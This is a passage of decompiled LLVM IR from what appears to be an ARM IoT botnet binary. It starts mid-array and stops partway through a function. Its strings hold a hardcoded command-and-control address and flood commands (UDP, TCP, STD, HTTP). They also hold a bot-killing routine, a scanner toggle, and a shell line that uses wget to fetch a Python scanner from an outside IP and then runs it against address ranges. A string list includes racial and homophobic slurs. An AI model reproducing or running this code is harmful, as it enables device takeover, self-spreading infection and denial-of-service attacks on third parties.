i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_38264.2814, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_382c0.2815, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_3831c.2816, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @global_var_38378.2817, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_383d8.2818, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_38420.2819, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_384b8.2820, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_38504.2821, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_38550.2822, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_385a0.2823, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_385e8.2824, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_3863c.2825, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_3868c.2826, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_386d4.2827, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_38720.2828, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_3876c.2829, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_387b4.2830, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_38804.2831, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_38854.2832, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_38888.2833, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_388bc.2834, i32 0, i32 0)]
@global_var_3757c.2837 = constant [6 x i8] c"close\00"
@global_var_37584.2838 = constant [11 x i8] c"keep-alive\00"
@global_var_37590.2839 = constant [7 x i8] c"accept\00"
@global_var_37598.2840 = constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_3757c.2837, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_37584.2838, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_37590.2839, i32 0, i32 0)]
@global_var_389fc.2845 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_38a3c.2847 = constant [6 x i8] c"arfgG\00"
@global_var_38a44.2848 = constant [9 x i8] c"HBiug655\00"
@global_var_38a50.2849 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_38a60.2850 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_38a74.2851 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_38a88.2852 = constant [12 x i8] c"GJjyur67458\00"
@global_var_38a94.2853 = constant [12 x i8] c"RYSDk747586\00"
@global_var_38aa0.2854 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_38aac.2855 = constant [10 x i8] c"KHGK7985i\00"
@global_var_38ab8.2856 = constant [11 x i8] c"yuituiILYF\00"
@global_var_38ac4.2857 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_38ad4.2858 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_38ae0.2859 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_38af0.2860 = constant [9 x i8] c"ewqdcftr\00"
@global_var_38afc.2861 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_38b0c.2862 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_38b18.2863 = constant [12 x i8] c"twehgbferhb\00"
@global_var_38b24.2864 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_38b30.2865 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_38b40.2866 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_38b50.2867 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_38b60.2868 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_38b6c.2869 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_38b7c.2870 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_38b8c.2871 = constant [12 x i8] c"yteytietyue\00"
@global_var_38b98.2872 = constant [9 x i8] c"qsortEQS\00"
@global_var_38ba4.2873 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_38bb4.2874 = constant [4 x i8] c"std\00"
@global_var_38bb8.2875 = constant [4 x i8] c"dts\00"
@global_var_38bbc.2876 = constant [6 x i8] c"hackz\00"
@global_var_38bc4.2877 = constant [7 x i8] c"shdyed\00"
@global_var_38bcc.2878 = constant [5 x i8] c"http\00"
@global_var_38bd4.2879 = constant [10 x i8] c"sghwiondc\00"
@global_var_38be0.2880 = constant [7 x i8] c"nigger\00"
@global_var_38be8.2881 = constant [6 x i8] c"pussy\00"
@global_var_38bf0.2882 = constant [7 x i8] c"faggot\00"
@global_var_38bf8.2883 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_38a3c.2847, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_38a44.2848, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_38a50.2849, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_38a60.2850, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_38a74.2851, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_38a88.2852, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_38a94.2853, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_38aa0.2854, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_38aac.2855, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_38ab8.2856, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_38ac4.2857, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_38ad4.2858, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_38ae0.2859, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_38af0.2860, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_38afc.2861, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_38b0c.2862, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_38b18.2863, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_38b24.2864, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_38b30.2865, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_38b40.2866, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_38b50.2867, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_38b60.2868, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_38b6c.2869, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_38b7c.2870, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_38b8c.2871, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_38b98.2872, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_38ba4.2873, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_38bb4.2874, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_38bb8.2875, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_38bbc.2876, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_38bc4.2877, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_38bcc.2878, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_38bd4.2879, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_38be0.2880, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_38be8.2881, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_38bf0.2882, i32 0, i32 0)]
@global_var_38c88.2887 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_38ca4.2889 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_38cc8.2894 = constant [4 x i8] c"all\00"
@global_var_38ccc.2896 = constant i32 44
@global_var_38cd0.2898 = constant [4 x i8] c"syn\00"
@global_var_38cd4.2900 = constant [4 x i8] c"rst\00"
@global_var_38cd8.2902 = constant [4 x i8] c"fin\00"
@global_var_38cdc.2904 = constant [4 x i8] c"ack\00"
@global_var_38ce0.2906 = constant [4 x i8] c"psh\00"
@global_var_38ce4.2908 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_38cf8.2912 = constant [6 x i8] c"PONG!\00"
@global_var_38d00.2914 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_38d0c.2917 = constant [10 x i8] c"My IP: %s\00"
@global_var_38d18.2919 = constant [7 x i8] c"PYTHON\00"
@global_var_38d20.2921 = constant [23 x i8] c"PYTHON RANGE [1,2,3,4]\00"
@global_var_38d38.2923 = constant [4 x i8] c"0FF\00"
@global_var_38d3c.2925 = constant [16 x i8] c"pkill -9 python\00"
@global_var_38d4c.2928 = constant [9 x i8] c"DOWNLOAD\00"
@global_var_38d58.2930 = constant [122 x i8] c"yum install python-paramiko -y;apt-get install python-paramiko -y;mkdir /.tmp;cd /.tmp;wget http://159.89.35.204/purge.py\00"
@global_var_38dd4.2932 = constant [20 x i8] c"Installs For Python\00"
@global_var_38de8.2934 = constant i32 49
@global_var_38dec.2936 = constant [39 x i8] c"cd /.tmp;python purge.py 500 SATAN 1 3\00"
@global_var_38e14.2938 = constant [27 x i8] c"Conncted To Python Scanner\00"
@global_var_38e30.2940 = constant i32 50
@global_var_38e34.2942 = constant [40 x i8] c"cd /.tmp;python purge.py 500 B 49.144 3\00"
@global_var_38e5c.2944 = constant i32 51
@global_var_38e60.2946 = constant [39 x i8] c"cd /.tmp;python purge.py 500 B 122.3 3\00"
@global_var_38e88.2948 = constant [8 x i8] c"BOTKILL\00"
@global_var_38e90.2950 = constant [13 x i8] c"Killing Bots\00"
@global_var_38ea0.2952 = constant [7 x i8] c"LOOPME\00"
@global_var_38ea8.2954 = constant [16 x i8] c"LOOPING PAYLOAD\00"
@global_var_38eb8.2956 = constant [8 x i8] c"SCANNER\00"
@global_var_38ec0.2958 = constant [17 x i8] c"SCANNER ON | OFF\00"
@global_var_38ed4.2960 = constant [4 x i8] c"OFF\00"
@global_var_4998c.2962 = global i32 0
@global_var_38ed8.2964 = constant [5 x i8] c" OFF\00"
@global_var_38ee0.2966 = constant [3 x i8] c"ON\00"
@global_var_38ee4.2968 = constant [4 x i8] c"UDP\00"
@global_var_38ee8.2971 = constant [5 x i8] c"HTTP\00"
@global_var_38ef0.2973 = constant [4 x i8] c"STD\00"
@global_var_38ef4.2975 = constant [4 x i8] c"TCP\00"
@global_var_38ef8.2977 = constant [5 x i8] c"STOP\00"
@global_var_38f00.2981 = constant [12 x i8] c"HOODASSSHIT\00"
@global_var_42a28.2984 = local_unnamed_addr global i32 -1
@global_var_31fe0.2986 = constant [18 x i8] c"159.89.35.204:775\00"
@global_var_42990.2987 = global [18 x i8]* @global_var_31fe0.2986
@global_var_42994.2989 = global i32 775
@global_var_38f0c.2991 = constant [8 x i8] c"8.8.8.8\00"
@global_var_38f14.2994 = constant [16 x i8] c"/proc/net/route\00"
@global_var_38f24.2996 = constant [11 x i8] c"\0900000000\09\00"
@global_var_42c70.2998 = global i32 0
@global_var_38f30.3000 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_38f40.3002 = constant [7 x i8] c"SERVER\00"
@global_var_38f48.3004 = constant [7 x i8] c"ROUTER\00"
@global_var_38f50.3006 = constant i32 0
@global_var_38f54.3009 = constant [5 x i8] c"sshd\00"
@global_var_38f5c.3011 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_42a24.3013 = global i32 1
@global_var_38f70.3016 = constant [13 x i8] c"BUILD %s:%s\0A\00"
@global_var_38f80.3018 = constant i32 47
@global_var_38fb8.3021 = constant [8 x i8] c"BUILD 1\00"
@global_var_38f84.3023 = constant i32 993024795
@global_var_38fc0.3028 = constant [5 x i8] c"PONG\00"
@global_var_38fc8.3030 = constant [4 x i8] c"DUP\00"
@global_var_38fcc.3032 = constant [5 x i8] c"MOVE\00"
@global_var_38fd4.3034 = constant [8 x i8] c"%s 2>&1\00"
@1 = constant [3 x i32] %wide-string
@global_var_38fe0.3038 = constant i32 32
@global_var_428d0.3044 = global i32 0
@global_var_1f608.3075 = constant i32 -369098708
@global_var_2369c.3090 = constant i32 -382910448
@global_var_2a3a0.3091 = constant i32 -382909968
@global_var_27dec.3092 = constant i32 -382910288
@global_var_2a8dc.3093 = constant i32 -382910224
@global_var_249dc.3120 = constant i32 -456978431
@global_var_428f0.3141 = local_unnamed_addr global i32 12
@global_var_259a8.3185 = constant i32 -478871519
@global_var_26334.3196 = constant i32 -382906384
@global_var_22d4c.3205 = constant i32 -442544040
@global_var_268f4.3211 = constant i32 -442564540
@global_var_2739c.3270 = constant i32 -369098502
@global_var_28188.3302 = constant i32 -2020859901
@global_var_28274.3305 = constant i32 -494075872
@global_var_23188.3306 = constant i32 -382910336
@global_var_49d6c.3309 = local_unnamed_addr global i32 0
@global_var_26764.3322 = constant i32 -442543860
@global_var_24950.3330 = constant i32 -369091194
@global_var_193d8.3383 = constant i32 436207625
@global_var_297a0.3397 = constant i32 -443088884
@global_var_18f14.3406 = constant i32 436207625
@global_var_264e8.3412 = constant i32 -382909968
@global_var_2b9f8.3418 = constant i32 -382906384
@global_var_15f50.3471 = constant i32 436207625
@global_var_2ce0c.3488 = constant i32 -478805983
@global_var_15388.3519 = constant i32 436207625
@global_var_2d6ec.3520 = constant i32 -382910352
@global_var_14d6c.3527 = constant i32 436207625
@global_var_28300.3552 = constant i32 -450904024
@global_var_2ecbc.3559 = constant i32 -442695584
@global_var_2f298.3570 = constant i32 -382910224
@global_var_2f400.3594 = constant i32 167772324
@global_var_1306c.3604 = constant i32 436207625
@global_var_302a0.3614 = constant i32 -504313148
@global_var_30288.3615 = constant i32 -483131392
@global_var_30134.3616 = constant i32 -481229311
@global_var_30310.3617 = constant i32 -477817729
@global_var_30410.3618 = constant i32 -476034303
@global_var_3064c.3619 = constant i32 -516685812
@global_var_30540.3620 = constant i32 -905969571
@global_var_30474.3621 = constant i32 -528203771
@global_var_306d4.3622 = constant i32 -478079873
@global_var_306b8.3623 = constant i32 -534704125
@global_var_30668.3624 = constant i32 -534704125
@global_var_30600.3625 = constant i32 -483131392
@global_var_30f3c.3633 = constant i32 -481296376
@global_var_31034.3634 = constant i32 -481296376
@global_var_310b8.3635 = constant i32 -369098732
@global_var_42c40.12 = external global i8*
@global_var_42c78.78 = local_unnamed_addr global i8 0
@global_var_42c79.79 = local_unnamed_addr global i8 0
@global_var_42934.3040 = local_unnamed_addr global i16 8
@global_var_38fdc.3036 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @_call_via_r0(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %arg1
}

define i32 @_call_via_r1(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80f4 = load i32, i32* @r0, align 4
  ret i32 %v1_80f4
}

define i32 @_call_via_r2(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80f8 = load i32, i32* @r0, align 4
  ret i32 %v1_80f8
}

define i32 @_call_via_r3(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80fc = load i32, i32* @r0, align 4
  ret i32 %v1_80fc
}

define i32 @_call_via_r4() local_unnamed_addr {
entry:
  %v0_8100 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v0_8100)
  %v1_8100 = load i32, i32* @r0, align 4
  ret i32 %v1_8100
}

define i32 @_call_via_r5() local_unnamed_addr {
entry:
  %v0_8104 = load i32, i32* @r5, align 4
  call void @__pseudo_branch(i32 %v0_8104)
  %v1_8104 = load i32, i32* @r0, align 4
  ret i32 %v1_8104
}

define i32 @_call_via_r6() local_unnamed_addr {
entry:
  %v0_8108 = load i32, i32* @r6, align 4
  call void @__pseudo_branch(i32 %v0_8108)
  %v1_8108 = load i32, i32* @r0, align 4
  ret i32 %v1_8108
}

define i32 @_call_via_r7() local_unnamed_addr {
entry:
  %v0_810c = load i32, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v0_810c)
  %v1_810c = load i32, i32* @r0, align 4
  ret i32 %v1_810c
}

define i32 @_call_via_r8() local_unnamed_addr {
entry:
  %v0_8110 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %v0_8110)
  %v1_8110 = load i32, i32* @r0, align 4
  ret i32 %v1_8110
}

define i32 @_call_via_r9() local_unnamed_addr {
entry:
  %v0_8114 = load i32, i32* @sb, align 4
  call void @__pseudo_branch(i32 %v0_8114)
  %v1_8114 = load i32, i32* @r0, align 4
  ret i32 %v1_8114
}

define i32 @_call_via_sl() local_unnamed_addr {
entry:
  %v0_8118 = load i32, i32* @sl, align 4
  call void @__pseudo_branch(i32 %v0_8118)
  %v1_8118 = load i32, i32* @r0, align 4
  ret i32 %v1_8118
}

define i32 @_call_via_fp() local_unnamed_addr {
entry:
  %v0_811c = load i32, i32* @fp, align 4
  call void @__pseudo_branch(i32 %v0_811c)
  %v1_811c = load i32, i32* @r0, align 4
  ret i32 %v1_811c
}

define i32 @_call_via_ip() local_unnamed_addr {
entry:
  %v0_8120 = load i32, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v0_8120)
  %v1_8120 = load i32, i32* @r0, align 4
  ret i32 %v1_8120
}

define i32 @_call_via_sp() local_unnamed_addr {
entry:
  %v0_8124 = load i32, i32* @sp, align 4
  call void @__pseudo_branch(i32 %v0_8124)
  %v1_8124 = load i32, i32* @r0, align 4
  ret i32 %v1_8124
}

define i32 @_call_via_lr() local_unnamed_addr {
entry:
  %v1_8128 = load i32, i32* @r0, align 4
  ret i32 %v1_8128
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_812c = load i32, i32* @r4, align 4
  store i32 %v3_812c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_42c40.12 to i32), i32* %r4.global-to-local, align 4
  %v2_8134 = load i8, i8* bitcast (i8** @global_var_42c40.12 to i8*), align 4
  %v2_8138 = icmp eq i8 %v2_8134, 0
  br i1 %v2_8138, label %dec_label_pc_8140, label %dec_label_pc_815c

dec_label_pc_8140:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* %r4.global-to-local, align 4
  %v3_8158 = inttoptr i32 %v2_8158 to i8*
  store i8 1, i8* %v3_8158, align 1
  %v2_815c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_815c

dec_label_pc_815c:                                ; preds = %entry, %dec_label_pc_8140
  %v2_815c = phi i32 [ %v3_812c, %entry ], [ %v2_815c.pre, %dec_label_pc_8140 ]
  store i32 %v2_815c, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_42c40.12, { 1, 0 }
  uselistorder label %dec_label_pc_815c, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8194 = load i32, i32* @global_var_428b8.22, align 4
  %v2_8198 = icmp eq i32 %v2_8194, 0
  br i1 %v2_8198, label %dec_label_pc_81b0, label %dec_label_pc_81a0

dec_label_pc_81a0:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_81b0

dec_label_pc_81b0:                                ; preds = %bb, %dec_label_pc_81a0
  ret i32 ptrtoint (i32* @global_var_428b8.22 to i32)

; uselistorder directives
  uselistorder i32* @global_var_428b8.22, { 1, 0 }
  uselistorder label %dec_label_pc_81b0, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @fp, align 4
  %v4_81d8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81f8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_21fc4.26 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 204752, i32 %arg1, i32 %v4_81d8)
  %v0_81fc = call i32 @abort()
  ret i32 %v0_81fc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_821c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_821c, i32* @global_var_42c7c.29, align 4
  %v1_823c = add i32 %v0_821c, -1640531527
  store i32 %v1_823c, i32* @global_var_42c80.30, align 4
  %v1_8258 = add i32 %v0_821c, 1013904242
  store i32 %v1_8258, i32* @global_var_42c84.31, align 4
  br label %dec_label_pc_8270

dec_label_pc_8270:                                ; preds = %entry, %dec_label_pc_8270
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_82b4, %dec_label_pc_8270 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8280 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_42c7c.29 to i32), i32 -12)
  %v6_8280 = inttoptr i32 %v5_8280 to i32*
  %v7_8280 = load i32, i32* %v6_8280, align 4
  %tmp10 = mul i32 %storemerge12, 4
  %v5_8290 = add i32 %tmp10, add (i32 ptrtoint (i32* @global_var_42c7c.29 to i32), i32 -8)
  %v6_8290 = inttoptr i32 %v5_8290 to i32*
  %v7_8290 = load i32, i32* %v6_8290, align 4
  %v2_8294 = xor i32 %storemerge12, -1640531527
  %v2_829c = xor i32 %v2_8294, %v7_8280
  %v2_82a4 = xor i32 %v2_829c, %v7_8290
  %v5_82ac = mul nuw nsw i32 %storemerge12, 4
  %v6_82ac = add i32 %v5_82ac, ptrtoint (i32* @global_var_42c7c.29 to i32)
  %v7_82ac = inttoptr i32 %v6_82ac to i32*
  store i32 %v2_82a4, i32* %v7_82ac, align 4
  %v1_82b4 = add nuw nsw i32 %storemerge12, 1
  %v7_82cc = icmp slt i32 %v1_82b4, 4096
  br i1 %v7_82cc, label %dec_label_pc_8270, label %dec_label_pc_82d0

dec_label_pc_82d0:                                ; preds = %dec_label_pc_8270
  %v1_82d8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_82d8

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8270, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %v2_8314 = load i32, i32* @global_var_42a30.34, align 4
  %v1_8318 = add i32 %v2_8314, 1
  %v3_8320 = urem i32 %v1_8318, 4096
  store i32 %v3_8320, i32* @global_var_42a30.34, align 4
  %v4_8338 = mul nuw nsw i32 %v3_8320, 4
  %v5_8338 = add i32 %v4_8338, ptrtoint (i32* @global_var_42c7c.29 to i32)
  %v6_8338 = inttoptr i32 %v5_8338 to i32*
  %v7_8338 = load i32, i32* %v6_8338, align 4
  %v6_8358 = udiv i32 %v7_8338, 228675
  store i32 %v6_8358, i32* @global_var_42a2c.37, align 4
  br i1 true, label %dec_label_pc_83e8, label %dec_label_pc_83c8

dec_label_pc_83c8:                                ; preds = %entry
  br label %dec_label_pc_83e8

dec_label_pc_83e8:                                ; preds = %entry, %dec_label_pc_83c8
  %v4_8408 = mul nuw nsw i32 %v3_8320, 4
  %v5_8408 = add i32 %v4_8408, ptrtoint (i32* @global_var_42c7c.29 to i32)
  %v6_8408 = inttoptr i32 %v5_8408 to i32*
  %v7_8408 = load i32, i32* %v6_8408, align 4
  ret i32 %v7_8408

; uselistorder directives
  uselistorder i32 %v3_8320, { 0, 2, 1 }
  uselistorder i32* @global_var_42c7c.29, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_42c7c.29 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_83e8, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_8448 = call i32 @strlen(i8* %arg1)
  store i32 %v3_8448, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8468

dec_label_pc_8468:                                ; preds = %dec_label_pc_8468, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8460, %dec_label_pc_8468 ]
  %v2_8474 = add i32 %stack_var_-24.0, %tmp
  %v1_8478 = inttoptr i32 %v2_8474 to i8*
  %v2_8478 = load i8, i8* %v1_8478, align 1
  %v3_8478 = zext i8 %v2_8478 to i32
  store i32 %v3_8478, i32* %r0.global-to-local, align 4
  %v1_8480 = call i32 @isspace(i32 %v3_8478)
  store i32 %v1_8480, i32* %r0.global-to-local, align 4
  %v2_8488 = icmp eq i32 %v1_8480, 0
  %v1_8460 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8488, label %dec_label_pc_84a0.preheader, label %dec_label_pc_8468

dec_label_pc_84a0.preheader:                      ; preds = %dec_label_pc_8468
  %v1_8450 = add i32 %v3_8448, -1
  %v5_84ac10 = icmp slt i32 %v1_8450, %stack_var_-24.0
  br i1 %v5_84ac10, label %dec_label_pc_8520.preheader, label %dec_label_pc_84b0

dec_label_pc_8494:                                ; preds = %dec_label_pc_84b0
  %v1_8498 = add i32 %stack_var_-20.011, -1
  %v5_84ac = icmp slt i32 %v1_8498, %stack_var_-24.0
  br i1 %v5_84ac, label %dec_label_pc_8520.preheader, label %dec_label_pc_84b0

dec_label_pc_84b0:                                ; preds = %dec_label_pc_84a0.preheader, %dec_label_pc_8494
  %stack_var_-20.011 = phi i32 [ %v1_8498, %dec_label_pc_8494 ], [ %v1_8450, %dec_label_pc_84a0.preheader ]
  %v2_84bc = add i32 %stack_var_-20.011, %tmp
  %v1_84c0 = inttoptr i32 %v2_84bc to i8*
  %v2_84c0 = load i8, i8* %v1_84c0, align 1
  %v3_84c0 = zext i8 %v2_84c0 to i32
  store i32 %v3_84c0, i32* %r0.global-to-local, align 4
  %v1_84c8 = call i32 @isspace(i32 %v3_84c0)
  store i32 %v1_84c8, i32* %r0.global-to-local, align 4
  %v2_84d0 = icmp eq i32 %v1_84c8, 0
  br i1 %v2_84d0, label %dec_label_pc_8520.preheader, label %dec_label_pc_8494

dec_label_pc_8520.preheader:                      ; preds = %dec_label_pc_8494, %dec_label_pc_84b0, %dec_label_pc_84a0.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8450, %dec_label_pc_84a0.preheader ], [ %v1_8498, %dec_label_pc_8494 ], [ %stack_var_-20.011, %dec_label_pc_84b0 ]
  br label %dec_label_pc_8520

dec_label_pc_84e4:                                ; preds = %dec_label_pc_8520
  %v2_8508 = add i32 %storemerge1, %tmp
  %v1_850c = inttoptr i32 %v2_8508 to i8*
  %v2_850c = load i8, i8* %v1_850c, align 1
  %v3_8510 = inttoptr i32 %v2_8544 to i8*
  store i8 %v2_850c, i8* %v3_8510, align 1
  %v1_8518 = add i32 %storemerge1, 1
  br label %dec_label_pc_8520

dec_label_pc_8520:                                ; preds = %dec_label_pc_8520.preheader, %dec_label_pc_84e4
  %storemerge1 = phi i32 [ %v1_8518, %dec_label_pc_84e4 ], [ %stack_var_-24.0, %dec_label_pc_8520.preheader ]
  %v7_852c = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_8538 = sub i32 %storemerge1, %stack_var_-24.0
  %v2_8544 = add i32 %v2_8538, %tmp
  br i1 %v7_852c, label %dec_label_pc_8530, label %dec_label_pc_84e4

dec_label_pc_8530:                                ; preds = %dec_label_pc_8520
  %v3_854c = inttoptr i32 %v2_8544 to i8*
  store i8 0, i8* %v3_854c, align 1
  %v1_8558 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_8558

; uselistorder directives
